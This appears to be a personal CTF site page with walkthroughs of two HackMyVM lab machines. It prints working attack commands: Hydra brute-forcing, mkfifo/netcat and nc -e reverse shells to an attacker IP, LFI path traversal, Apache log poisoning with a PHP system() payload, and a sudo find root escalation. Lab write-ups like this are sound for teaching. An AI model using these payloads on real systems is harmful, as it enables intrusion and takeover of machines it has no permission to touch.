---
layout: page
title: HackMyVM
subtitle: Community-built vulnerable Linux and Windows machines
permalink: /ctf/platforms/hackmyvm/
---

<div class="platform-hero hmv-hero">
  <div class="plat-hero-icon">🎮</div>
  <div class="plat-hero-text">
    <h2>HackMyVM</h2>
    <p>A community-driven hacking platform featuring custom-built machines designed to test lateral thinking and enumeration.</p>
    <div class="plat-hero-badges">
      <span class="badge badge-success">Rank: Top 50</span>
      <span class="badge badge-info">20+ VMs Solved</span>
      <span class="badge badge-warning">Active Contributor</span>
    </div>
  </div>
</div>

<div class="machine-filter-bar">
  <button class="mf-btn active" data-filter="all">All</button>
  <button class="mf-btn" data-filter="linux">🐧 Linux</button>
  <button class="mf-btn" data-filter="windows">🪟 Windows</button>
  <button class="mf-btn" data-filter="easy">Easy</button>
  <button class="mf-btn" data-filter="medium">Medium</button>
  <button class="mf-btn" data-filter="hard">Hard</button>
</div>

---

## Machine List

<div class="machines-list">

  <div class="machine-card" data-os="linux" data-diff="easy">
    <div class="mc-left"><span class="mc-os linux">🐧</span><div><h4 class="mc-name">Friendly</h4><span class="mc-ip">DHCP</span></div></div>
    <div class="mc-mid"><span class="mc-tech">Port 80 HTTP enum · wordlist generation via cewl · SUID binary exploit</span></div>
    <div class="mc-right"><span class="mc-diff easy">Easy</span><a href="#friendly" class="mc-btn">Writeup ↓</a></div>
  </div>

  <div class="machine-card" data-os="linux" data-diff="medium">
    <div class="mc-left"><span class="mc-os linux">🐧</span><div><h4 class="mc-name">Bubble</h4><span class="mc-ip">DHCP</span></div></div>
    <div class="mc-mid"><span class="mc-tech">Apache Log Injection LFI → reverse shell · local port forward · root exploit</span></div>
    <div class="mc-right"><span class="mc-diff medium">Medium</span><a href="#bubble" class="mc-btn">Writeup ↓</a></div>
  </div>

  <div class="machine-card" data-os="windows" data-diff="hard">
    <div class="mc-left"><span class="mc-os windows">🪟</span><div><h4 class="mc-name">Gift</h4><span class="mc-ip">DHCP</span></div></div>
    <div class="mc-mid"><span class="mc-tech">SMB null session → user enumeration · AD CS certificate relay · GPO path</span></div>
    <div class="mc-right"><span class="mc-diff hard">Hard</span><a href="#gift" class="mc-btn">Writeup ↓</a></div>
  </div>

</div>

---

## 📝 Machine Walkthroughs

### Friendly — Linux Easy {#friendly}

#### Enumeration
We start with a quick `nmap` scan against the DHCP target IP:
```bash
nmap -sC -sV -oN nmap.txt 192.168.1.120
```

Only SSH (22) and HTTP (80) are open. Navigating to port 80 reveals a standard custom blog. Running `dirb` or `gobuster` returns an `/admin/` folder requiring password authentication.

#### Initial Access
Since there is no default username or password, we generate a custom wordlist based on the home page content using `cewl`:
```bash
cewl http://192.168.1.120/ -w words.txt
```
Using Hydra to brute-force the admin page:
```bash
hydra -l admin -P words.txt 192.168.1.120 http-get-form "/admin/:user=^USER^&pass=^PASS^:F=Unauthorized"
# Found credentials: admin:friendship
```

Logging in gives access to an upload panel. We upload a PHP web shell to get RCE, and execute a netcat listener payload to receive our reverse shell:
```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.5 4444 >/tmp/f
```

#### Privilege Escalation
Once on the box, we run `sudo -l` and find we can run `/usr/bin/find` as root without a password:
```bash
sudo -u root /usr/bin/find . -exec /bin/sh -p \; -quit
# id -> uid=0(root) gid=0(root)
```
Read the root flag in `/root/flag.txt`.

---

### Bubble — Linux Medium {#bubble}

#### Enumeration & Log Injection
Scanning port 80 shows an index with an include parameter: `http://10.0.0.22/?page=home.php`. 
We verify Local File Inclusion (LFI) by reading `/etc/passwd`:
```
http://10.0.0.22/?page=../../../../etc/passwd
```

We poison the Apache access log `/var/log/apache2/access.log` by sending a request containing PHP code inside the User-Agent header:
```bash
curl -A "<?php system(\$_GET['cmd']); ?>" http://10.0.0.22/
```
We then trigger the code using LFI:
```
http://10.0.0.22/?page=../../../../var/log/apache2/access.log&cmd=nc -e /bin/bash 10.0.0.5 4444
```

#### Privilege Escalation
On checking local network sockets, port 8080 is listening on localhost only. We tunnel it using SSH port forwarding:
```bash
ssh -L 8080:127.0.0.1:8080 bubble@10.0.0.22
```
A locally hosted web panel runs a vulnerable version of Jenkins. We run a Groovy script through the Jenkins Script Console to get a shell as root.

<script>
document.addEventListener('DOMContentLoaded', function() {
  const filterBtns = document.querySelectorAll('.machine-filter-bar .mf-btn');
  const machineCards = document.querySelectorAll('.machine-card');
  filterBtns.forEach(btn => {
    btn.addEventListener('click', function() {
      const filter = this.dataset.filter;
      filterBtns.forEach(b => b.classList.remove('active'));
      this.classList.add('active');
      machineCards.forEach(card => {
        if (filter === 'all' || card.dataset.os === filter || card.dataset.diff === filter) {
          card.style.display = 'flex';
        } else {
          card.style.display = 'none';
        }
      });
    });
  });
});
</script>
